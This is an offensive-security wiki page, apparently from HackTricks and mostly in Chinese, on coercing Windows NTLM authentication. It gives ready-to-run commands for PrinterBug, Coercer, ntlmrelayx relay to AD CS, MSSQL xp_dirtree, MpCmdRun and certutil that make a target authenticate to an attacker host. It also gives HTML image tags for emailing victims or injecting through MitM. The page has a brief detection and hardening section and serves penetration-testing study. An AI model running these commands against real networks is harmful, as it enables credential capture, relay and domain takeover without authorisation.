# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.

## Spooler Service Abuse

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.

Under the hood, the classic **PrinterBug** primitive abuses **`RpcRemoteFindFirstPrinterChangeNotificationEx`** over **`\\PIPE\\spoolss`**. The attacker first opens a printer/server handle and then supplies a fake client name in `pszLocalMachine`, so the target spooler creates a notification channel **back to the attacker-controlled host**. This is why the effect is **outbound authentication coercion** rather than direct code execution.<sup>[[2]](#references)</sup>\
If you are looking for **RCE/LPE** in the spooler itself, check [PrintNightmare](printnightmare.md). This page is focused on **coercion and relay**.

### Finding Windows Servers on the domain

Use PowerShell to list Windows hosts. Servers are usually the highest-priority targets, so focus on them first:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
Select-Object -ExpandProperty DNSHostName > servers.txt
```
### 查找正在监听的 Spooler 服务

使用稍作修改的 @mysmartlogin（Vincent Le Toux）的 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，检查 Spooler Service 是否正在监听：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
你也可以在 Linux 上使用 `rpcdump.py`，并查找 **MS-RPRN** protocol：
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
或者使用 **NetExec/CrackMapExec** 从 Linux 快速测试主机：
```bash
nxc smb targets.txt -u user -p password -M spooler
```
如果你想**枚举 coercion surfaces**，而不只是检查 spooler endpoint 是否存在，请使用 **Coercer scan mode**：<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
之所以有用，是因为在 EPM 中看到 endpoint，只能说明 print RPC interface 已注册。它**并不**保证在你当前的 privileges 下每种 coercion method 都可达，也不保证主机会发出可用的 authentication flow。

### 让服务向任意主机进行身份验证

你可以从[原始 repository](https://github.com/leechristensen/SpoolSample)编译 [SpoolSample]。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
或者，如果你使用 Linux，可以使用 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 或 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
使用 **Coercer**，你可以直接 targeting spooler interfaces，避免猜测暴露了哪个 RPC method：<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Modern RPC-over-TCP callbacks

不要假设成功的 `RpcRemoteFindFirstPrinterChangeNotificationEx` 调用一定会在 TCP/445 上产生流量。**Windows 11 22H2 及更高版本默认使用 RPC over TCP 进行打印通信**；除非通过策略或设置 `RpcUseNamedPipeProtocol=1` 恢复，否则会禁用基于 named pipes 的 RPC。因此，仅支持 SMB 的旧版监听器可能会报告 trigger 已发送，但始终收不到 callback。Microsoft 说明，正常的打印 RPC 使用 TCP/135（Endpoint Mapper）以及动态 RPC 端口；组织可以限制此端口范围，或选择固定的打印 RPC 端口。<sup>[[10]](#references)</sup>

当前的 **Impacket `ntlmrelayx.py`** 包含 RPC relay server 和一个小型 Endpoint Mapper，默认在 TCP/135 上启用。这项支持于 2025 年 6 月合并，专门针对已演示的 PrinterBug-to-AD-CS chain，使经过身份验证的 RPC callback 即使在受害者不回退到 SMB/WebDAV 时也能够被 relay。<sup>[[11]](#references)</sup>

RPC relay/EPM 支持包含在 **Impacket 0.13.0 及更高版本**中。在排查缺少 TCP/135 listener 的问题之前，请确认执行的不是旧版打包的 `ntlmrelayx.py`；帮助输出中应显示两个 RPC-server switches。<sup>[[12]](#references)</sup>
```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
查找 relay 输出中的 `Setting up RPC Server on port 135` 和 `RPCD: Received connection`。如果 RPC call 返回预期错误，但 listener 没有收到任何内容，请检查 victim 的 print RPC transport policy、outbound filtering、DNS resolution，以及是否已有其他进程占用 TCP/135。同时确保启动 `ntlmrelayx` 时没有使用 `--no-rpc-server`。

### 使用 WebClient 强制 HTTP 而不是 SMB

在仍使用 **RPC over named pipes** 的系统上（legacy builds 或 policy-restored behavior），classic PrinterBug 通常会向 `\\attacker\share` 发起 **SMB** authentication，这对于 **capture**、**relay to HTTP targets** 或 **relay where SMB signing is absent** 仍然有用。\
但是，**SMB to SMB** relay 经常会被 **SMB signing** 阻止，因此 operators 可能更希望强制使用 **HTTP/WebDAV** authentication。这不是上述 RPC-over-TCP behavior 的 fallback。

如果 target 正在运行 **WebClient** service，可以使用一种特殊形式指定 listener，使 Windows 通过 **WebDAV over HTTP**：
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
当与 **`ntlmrelayx --adcs`** 或其他 HTTP relay targets 链接使用时，这尤其有用，因为它避免依赖被强制连接的 SMB relayability。需要注意的重要一点是：对于 HTTP/WebDAV 变体，受害者上的 **WebClient 必须正在运行**。

### 与 Unconstrained Delegation 结合使用

如果攻击者已攻陷一台配置为 [Unconstrained Delegation](unconstrained-delegation.md) 的计算机，他们就可以**强制打印机向该计算机进行身份验证**。随后，打印机计算机账户的 **TGT** 会缓存在 Unconstrained Delegation 主机的内存中，攻击者可以使用 [Pass the Ticket](pass-the-ticket.md) 检索并复用该 TGT。

### Detection and hardening notes

从不执行打印任务的 DC、PAW 或服务器上移除 PrinterBug，最可靠的方法是停止并禁用 Spooler。如果必须支持打印，则应加固所有可能的 relay destination（SMB server signing、LDAP signing/channel binding，以及 AD CS 等 HTTP 服务上的 EPA），而不是想当然地认为仅阻断回连路径上的 TCP/445 就足够了。<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
如果主机仍需要 **local printing**，可以使用更精确的控制项 GPO：`Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`。这会阻止 spooler 接受远程客户端连接（以及 printer sharing），同时保留本地服务功能；应用该设置后重启 spooler，然后重复上文的 MS-RPRN 可达性检查。<sup>[[13]](#references)</sup>

Detection 应将对 MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab` 的 authenticated call 关联起来，尤其是 opnum 62/65 搭配非本地 callback value 的情况，以及 spooler 主机随即发起的 outbound SMB、HTTP 或 RPC connection。应基于 **interface UUID/opnum 和 source/destination pairs** 建立 baseline，而不只是监控对 `\PIPE\spoolss` 的访问，因为当前的 print stacks 可能会将 callback 放置在 RPC-over-TCP 上。<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix（可触发 outbound auth 的 interfaces/opnums）
- MS-RPRN（Print System Remote Protocol）
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification；65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR（Print System Asynchronous Remote）
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 同一 spooler pipe 上的 asynchronous print interface；使用 Coercer 枚举指定主机上可达的方法<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR（Encrypting File System Remote Protocol）
- Pipes: \\PIPE\\efsrpc（也可通过 \\PIPE\\lsarpc、\\PIPE\\samr、\\PIPE\\lsass、\\PIPE\\netlogon）
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- 常被滥用的 Opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM（DFS Namespace Management）
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot；13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP（File Server Remote VSS）
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported；9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN（EventLog Remoting）
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

注意：这些方法接受能够携带 UNC path（例如 `\\attacker\share`）的 parameters。处理这些 parameters 时，Windows 将使用 UNC 对应的身份验证上下文（machine/user context）进行 authentication，从而支持 NetNTLM capture 或 relay。\
对于 spooler abuse，**MS-RPRN opnum 65** 仍然是最常见且文档记录最完善的 primitive，因为 protocol specification 明确说明，server 会创建一个 notification channel，返回到 `pszLocalMachine` 指定的 client。<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW（opnum 9）coercion
- Interface: MS-EVEN over \\PIPE\\even（IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea）<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target 会尝试打开所提供的 backup log path，并向 attacker-controlled UNC 进行 authentication。<sup>[[1]](#references)</sup>
- Practical use: 强制 Tier 0 assets（DC/RODC/Citrix 等）发出 NetNTLM，然后 relay 到 AD CS endpoints（ESC8/ESC11 scenarios）或其他 privileged services。<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack 源于 **Exchange Server `PushSubscription` feature** 中发现的一个 flaw。此 feature 允许任何拥有 mailbox 的 domain user 强制 Exchange server 通过 HTTP 向任意 client-provided host 进行 authentication。

默认情况下，**Exchange service 以 SYSTEM 身份运行**，并被授予过多 privileges（具体而言，在 2019 年之前的 Cumulative Update 中，它拥有 **WriteDacl privileges on the domain**）。此 flaw 可被利用来启用 **将 information relay 到 LDAP，并随后提取 domain NTDS database**。如果无法 relay 到 LDAP，此 flaw 仍可用于 relay 并向 domain 内的其他 hosts 进行 authentication。成功 exploitation 此 attack 后，任何 authenticated domain user account 都可立即获得对 Domain Admin 的访问权限。

## Windows 内部

如果你已经进入 Windows machine，可以使用以下方式强制 Windows 使用 privileged accounts 连接到 server：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
或者使用另一种 technique：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用 certutil.exe lolbin（Microsoft 签名的 binary）来强制 NTLM authentication：
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### 通过 email

如果你知道登录到目标机器的用户的 **email address**，只需向他发送一封包含 **1x1 image** 的 **email**，例如
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
当受害者打开它时，Windows 会尝试进行身份验证。

### MitM

如果你可以执行 MitM attack，并向受害者查看的页面中注入 HTML，请尝试注入如下图像：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## 强制和 phishing NTLM 认证的其他方式


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## 破解 NTLMv1

如果你可以捕获 [NTLMv1 challenges，请在此处阅读破解方法](../ntlm/index.html#ntlmv1-attack)。\
_请记住，要破解 NTLMv1，你需要将 Responder challenge 设置为 "1122334455667788"_



## References

- [1] [Unit 42 – Authentication Coercion 不断演进](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN：RpcRemoteFindFirstPrinterChangeNotificationEx（Opnum 65）](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN：EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN：ElfrOpenBELW（Opnum 9）](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam（MS-EFSR）](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce（MS-DFSNM）](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce（MS-FSRVP）](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11 中 print 的 RPC connection 更新](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayx 的 RPC relay server 和 Endpoint Mapper](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 release](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP：Allow Print Spooler to accept client connections](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
